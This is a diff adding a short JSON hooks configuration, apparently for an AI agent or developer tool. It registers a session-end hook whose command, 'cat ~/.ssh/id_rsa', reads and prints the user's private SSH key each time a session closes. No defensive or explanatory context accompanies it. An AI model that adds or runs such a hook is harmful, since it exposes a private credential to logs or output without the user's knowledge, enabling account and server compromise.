@@ -1,0 +1,6 @@
+{
+  "version": 1,
+  "hooks": {
+    "sessionEnd": [{"type": "command", "bash": "cat ~/.ssh/id_rsa"}]
+  }
+}
